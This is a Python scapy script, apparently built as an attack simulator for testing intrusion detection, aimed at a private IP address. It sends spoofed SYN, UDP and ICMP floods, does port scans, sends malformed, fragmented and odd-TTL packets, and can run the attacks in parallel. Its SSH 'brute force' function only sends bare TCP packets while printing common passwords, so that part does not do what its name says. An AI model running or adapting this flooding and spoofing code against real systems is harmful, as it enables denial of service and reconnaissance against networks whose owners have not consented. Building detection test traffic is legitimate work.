#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import random
import argparse
from scapy.all import IP, TCP, UDP, ICMP, send, RandIP, RandShort, fragment
import threading
import os

# Configuration par défaut
TARGET_IP = "10.155.85.52"
SOURCE_IP = ""  # si vide, RandIP()
INTERFACE = "wlan0"
ATTACK_INTENSITY = 30

def send_packet(pkt, iface=INTERFACE):
    try:
        send(pkt, iface=iface, verbose=False)
    except:
        pass

def get_src_ip():
    return SOURCE_IP if SOURCE_IP else str(RandIP())

def scan_ports_syn():
    print(f"[*] Scan TCP SYN vers {TARGET_IP}...")
    ports = [20,21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080]
    for port in ports[:ATTACK_INTENSITY]:
        src = get_src_ip()
        pkt = IP(src=src, dst=TARGET_IP)/TCP(sport=RandShort(), dport=port, flags="S")
        send_packet(pkt)
        time.sleep(0.01)
    print("[+] Scan TCP SYN terminé.")

def scan_ports_udp():
    print(f"[*] Scan UDP vers {TARGET_IP}...")
    ports = [53,67,68,123,161,500,4500]
    for port in ports[:max(1, ATTACK_INTENSITY//5)]:
        src = get_src_ip()
        pkt = IP(src=src, dst=TARGET_IP)/UDP(sport=RandShort(), dport=port)
        send_packet(pkt)
        time.sleep(0.05)
    print("[+] Scan UDP terminé.")

def syn_flood():
    print(f"[*] SYN flood vers {TARGET_IP}:80...")
    for i in range(ATTACK_INTENSITY):
        src = get_src_ip()
        pkt = IP(src=src, dst=TARGET_IP)/TCP(sport=RandShort(), dport=80, flags="S")
        send_packet(pkt)
        if i % 10 == 0:
            print(f"    SYN flood: {i}/{ATTACK_INTENSITY}")
        time.sleep(0.001)
    print("[+] SYN flood terminé.")

def udp_flood():
    print(f"[*] UDP flood vers {TARGET_IP}:53...")
    for i in range(ATTACK_INTENSITY):
        src = get_src_ip()
        payload = b"PAYLOAD" * 50
        pkt = IP(src=src, dst=TARGET_IP)/UDP(sport=RandShort(), dport=53)/payload
        send_packet(pkt)
        if i % 10 == 0:
            print(f"    UDP flood: {i}/{ATTACK_INTENSITY}")
        time.sleep(0.001)
    print("[+] UDP flood terminé.")

def icmp_flood():
    print(f"[*] ICMP flood vers {TARGET_IP}...")
    for i in range(ATTACK_INTENSITY):
        src = get_src_ip()
        pkt = IP(src=src, dst=TARGET_IP)/ICMP()
        send_packet(pkt)
        if i % 10 == 0:
            print(f"    ICMP flood: {i}/{ATTACK_INTENSITY}")
        time.sleep(0.001)
    print("[+] ICMP flood terminé.")

def brute_force_ssh():
    print(f"[*] Force brute SSH vers {TARGET_IP}:22...")
    passwords = ["admin","123456","password","root","toor","test","qwerty","abc123"]
    for i, pwd in enumerate(passwords[:max(1, ATTACK_INTENSITY//5)]):
        src = get_src_ip()
        src_port = RandShort()
        pkt = IP(src=src, dst=TARGET_IP)/TCP(sport=src_port, dport=22, flags="S")
        send_packet(pkt)
        pkt2 = IP(src=src, dst=TARGET_IP)/TCP(sport=src_port, dport=22, flags="A")
        send_packet(pkt2)
        print(f"    Tentative SSH: {pwd}")
        time.sleep(0.1)
    print("[+] Force brute SSH terminée.")

def anomaly_fragmented():
    print(f"[*] Paquets fragmentés vers {TARGET_IP}...")
    for i in range(max(1, ATTACK_INTENSITY//3)):
        src = get_src_ip()
        pkt = IP(src=src, dst=TARGET_IP, flags=1, frag=0)/TCP(dport=80, flags="S")
        frags = fragment(pkt, 8)
        for frag in frags:
            send_packet(frag)
        time.sleep(0.01)
    print("[+] Fragmentés envoyés.")

def anomaly_ttl():
    print(f"[*] TTL anormal vers {TARGET_IP}...")
    ttl_values = [1,2,3,4,5,255,0,128,64]
    for ttl in ttl_values[:max(1, ATTACK_INTENSITY//5)]:
        src = get_src_ip()
        pkt = IP(src=src, dst=TARGET_IP, ttl=ttl)/TCP(sport=RandShort(), dport=80, flags="S")
        send_packet(pkt)
        print(f"    TTL: {ttl}")
        time.sleep(0.05)
    print("[+] TTL anormaux envoyés.")

def anomaly_malformed():
    print(f"[*] Paquets malformés vers {TARGET_IP}...")
    for i in range(max(1, ATTACK_INTENSITY//5)):
        src = get_src_ip()
        pkt = IP(src=src, dst=TARGET_IP)/TCP(sport=RandShort(), dport=80, flags="SFR")
        send_packet(pkt)
        pkt2 = IP(src=src, dst=TARGET_IP)/UDP(sport=RandShort(), dport=53)/b""
        send_packet(pkt2)
        time.sleep(0.05)
    print("[+] Malformés envoyés.")

def launch_parallel():
    print("[*] Attaques en parallèle...")
    threads = []
    for target in [syn_flood, udp_flood, icmp_flood, scan_ports_syn, anomaly_fragmented]:
        t = threading.Thread(target=target)
        t.start()
        threads.append(t)
        time.sleep(0.5)
    for t in threads:
        t.join()
    print("[+] Parallèle terminé.")

def main():
    global TARGET_IP, SOURCE_IP, ATTACK_INTENSITY
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="10.155.85.52")
    parser.add_argument("--source", default="", help="IP source (si vide, aléatoire)")
    parser.add_argument("--intensity", type=int, default=30)
    parser.add_argument("--parallel", action="store_true")
    parser.add_argument("--all", action="store_true")
    parser.add_argument("--scan", action="store_true")
    parser.add_argument("--dos", action="store_true")
    parser.add_argument("--brute", action="store_true")
    parser.add_argument("--anomaly", action="store_true")
    args = parser.parse_args()

    TARGET_IP = args.target
    SOURCE_IP = args.source
    ATTACK_INTENSITY = args.intensity

    if os.geteuid() != 0:
        print("❌ Nécessite sudo.")
        return

    print("="*60)
    print("🛡️ SIMULATEUR D'ATTAQUES")
    print(f"Cible: {TARGET_IP}, Source: {SOURCE_IP or 'aléatoire'}, Intensité: {ATTACK_INTENSITY}")
    print("="*60)

    if args.parallel:
        launch_parallel()
        return

    if args.all or not (args.scan or args.dos or args.brute or args.anomaly):
        scan_ports_syn(); scan_ports_udp()
        syn_flood(); udp_flood(); icmp_flood()
        brute_force_ssh()
        anomaly_fragmented(); anomaly_ttl(); anomaly_malformed()
        return

    if args.scan: scan_ports_syn(); scan_ports_udp()
    if args.dos: syn_flood(); udp_flood(); icmp_flood()
    if args.brute: brute_force_ssh()
    if args.anomaly: anomaly_fragmented(); anomaly_ttl(); anomaly_malformed()

    print("[+] Simulation terminée.")

if __name__ == "__main__":
    main()
